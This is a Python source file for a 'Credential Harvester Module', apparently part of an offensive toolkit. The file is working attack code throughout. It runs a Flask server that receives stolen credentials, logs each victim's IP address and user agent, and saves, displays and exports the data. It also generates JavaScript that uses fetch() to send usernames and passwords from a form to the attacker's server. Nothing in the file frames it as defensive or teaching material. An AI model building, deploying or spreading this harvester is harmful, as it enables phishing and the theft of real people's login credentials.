#!/usr/bin/env python3

import os
import json
import datetime
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich.table import Table
from flask import Flask, request, jsonify
import threading
import webbrowser

console = Console()

class CredentialHarvester:
    def __init__(self):
        self.app = Flask(__name__)
        self.output_dir = 'output/harvested'
        self.credentials = []
        self._ensure_output_dir()
        self.setup_routes()

    def _ensure_output_dir(self):
        """Ensure output directory exists."""
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir, exist_ok=True)

    def setup_routes(self):
        """Set up Flask routes for the credential harvester."""
        @self.app.route('/harvest', methods=['POST'])
        def harvest():
            data = request.get_json()
            if data:
                timestamp = datetime.datetime.now().isoformat()
                ip_address = request.remote_addr
                user_agent = request.headers.get('User-Agent')
                
                harvested_data = {
                    'timestamp': timestamp,
                    'ip_address': ip_address,
                    'user_agent': user_agent,
                    'credentials': data
                }
                
                self.credentials.append(harvested_data)
                self._save_credentials()
                
                console.print("[green]New credentials harvested![/green]")
                return jsonify({'status': 'success'})
            return jsonify({'status': 'error', 'message': 'No data received'})

    def _save_credentials(self):
        """Save harvested credentials to a file."""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(self.output_dir, f'harvested_{timestamp}.json')
        
        with open(filename, 'w') as f:
            json.dump(self.credentials, f, indent=4)

    def start_server(self, host='0.0.0.0', port=8081):
        """Start the Flask server for credential harvesting."""
        try:
            self.app.run(host=host, port=port, debug=False)
        except Exception as e:
            console.print(f"[red]Failed to start server: {str(e)}[/red]")

    def view_credentials(self):
        """Display harvested credentials in a table format."""
        if not self.credentials:
            console.print("[yellow]No credentials harvested yet.[/yellow]")
            return

        table = Table(title="Harvested Credentials")
        table.add_column("Timestamp", style="cyan")
        table.add_column("IP Address", style="green")
        table.add_column("Credentials", style="yellow")

        for entry in self.credentials:
            creds = json.dumps(entry['credentials'], indent=2)
            table.add_row(
                entry['timestamp'],
                entry['ip_address'],
                creds
            )

        console.print(table)

    def export_credentials(self):
        """Export harvested credentials to a file."""
        if not self.credentials:
            console.print("[yellow]No credentials to export.[/yellow]")
            return

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(self.output_dir, f'export_{timestamp}.json')

        with open(filename, 'w') as f:
            json.dump(self.credentials, f, indent=4)

        console.print(f"[green]Credentials exported to: {filename}[/green]")

    def generate_javascript(self, server_url):
        """Generate JavaScript code for credential harvesting."""
        js_code = f'''
// Credential Harvesting JavaScript Code
function harvestCredentials(formData) {{
    fetch('{server_url}/harvest', {{
        method: 'POST',
        headers: {{
            'Content-Type': 'application/json',
        }},
        body: JSON.stringify(formData)
    }})
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));
}}

// Example usage:
// harvestCredentials({{username: 'user', password: 'pass'}});
'''
        console.print(Panel(js_code, title="JavaScript Code"))
        return js_code

    def run(self):
        """Main method to run the credential harvester module."""
        console.print(Panel("[bold red]Credential Harvester Module[/bold red]"))

        while True:
            console.print("\n1. Start Harvester Server")
            console.print("2. View Harvested Credentials")
            console.print("3. Export Credentials")
            console.print("4. Generate JavaScript Code")
            console.print("5. Back to Main Menu")

            choice = Prompt.ask("Select an option", choices=["1", "2", "3", "4", "5"])

            if choice == "1":
                port = int(Prompt.ask("Enter port number", default="8081"))
                console.print(f"[green]Starting harvester server on port {port}...[/green]")
                console.print(f"[yellow]Server endpoint: http://localhost:{port}/harvest[/yellow]")
                
                # Start the server in a separate thread
                server_thread = threading.Thread(
                    target=self.start_server,
                    kwargs={'port': port}
                )
                server_thread.daemon = True
                server_thread.start()

            elif choice == "2":
                self.view_credentials()

            elif choice == "3":
                self.export_credentials()

            elif choice == "4":
                server_url = Prompt.ask(
                    "Enter harvester server URL",
                    default=f"http://localhost:8081"
                )
                self.generate_javascript(server_url)

            elif choice == "5":
                break 